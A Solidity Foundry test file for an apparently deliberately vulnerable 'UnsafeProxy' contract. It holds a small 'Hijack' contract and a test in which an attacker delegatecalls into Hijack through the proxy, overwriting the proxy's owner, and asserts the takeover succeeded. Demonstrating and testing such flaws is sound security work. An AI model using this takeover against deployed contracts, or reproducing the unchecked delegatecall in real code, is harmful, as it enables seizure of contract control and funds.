// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {UnsafeProxy} from "../src/UnsafeProxy.sol";

contract Hijack {
    address public owner;

    function take() external {
        owner = msg.sender;
    }
}

contract UnsafeProxyTest is Test {
    UnsafeProxy internal proxy;

    function setUp() public {
        proxy = new UnsafeProxy();
    }

    function test_DelegatecallOverwritesOwner() public {
        address attacker = makeAddr("attacker");
        Hijack hijack = new Hijack();

        vm.prank(attacker);
        proxy.execute(address(hijack), abi.encodeWithSelector(Hijack.take.selector));

        assertEq(proxy.owner(), attacker);
    }
}
